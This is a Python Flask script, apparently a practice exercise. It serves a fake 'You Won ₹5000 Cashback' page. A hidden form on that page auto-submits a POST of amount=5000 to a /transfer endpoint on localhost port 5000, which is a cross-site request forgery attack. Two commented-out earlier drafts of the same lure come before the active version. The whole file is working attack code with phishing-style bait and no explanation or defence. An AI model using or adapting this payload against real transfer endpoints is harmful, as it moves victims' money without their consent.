# # from flask import Flask

# # app = Flask(__name__)

# # @app.route("/")
# # def attack():
# #     return """
# # <!DOCTYPE html>
# # <html>
# # <head>
# # <title>Prize Page</title>
# # <style>
# # body{
# #     background:black;
# #     color:red;
# #     font-family:Arial;
# #     text-align:center;
# #     padding-top:150px;
# # }
# # h2{font-size:40px;}
# # button{
# #     padding:15px 40px;
# #     font-size:20px;
# #     background:red;
# #     color:white;
# #     border:none;
# # }
# # </style>
# # </head>

# # <body>

# # <h2>🎁 You Won ₹5000!</h2>
# # <p>Click below to claim reward</p>

# # <form action="http://127.0.0.1:5000/transfer" method="POST">
# # <input type="hidden" name="amount" value="5000">
# # <button>CLAIM NOW</button>
# # </form>

# # <script>
# # document.forms[0].submit();
# # </script>

# # </body>
# # </html>
# # """

# # if __name__ == "__main__":
# #     app.run(port=8000)



# from flask import Flask

# app = Flask(__name__)

# @app.route("/")
# def attack():
#     return """
#     <h2>🎁 Claim Your Reward</h2>

#     <form action="http://127.0.0.1:5000/transfer" method="POST">
#         <input type="hidden" name="amount" value="5000">
#     </form>

#     <script>
#         document.forms[0].submit();
#     </script>
#     """

# if __name__ == "__main__":
#     app.run(port=8000)




from flask import Flask

app = Flask(__name__)

@app.route("/")
def attack():
    return """
<!DOCTYPE html>
<html>
<head>
<title>Claim Reward</title>

<style>
body{
    background:black;
    color:red;
    font-family:Arial;
    text-align:center;
    padding-top:150px;
}
h1{font-size:40px;}
</style>

</head>

<body>

<h1>🎉 Congratulations!</h1>
<h2>You Won ₹5000 Cashback!</h2>
<p>Processing your reward...</p>

<form id="csrfForm" action="http://127.0.0.1:5000/transfer" method="POST">
    <input type="hidden" name="amount" value="5000">
</form>

<script>
setTimeout(function(){
    document.getElementById("csrfForm").submit();
}, 2000);
</script>

</body>
</html>
"""

if __name__ == "__main__":
    app.run(port=8000)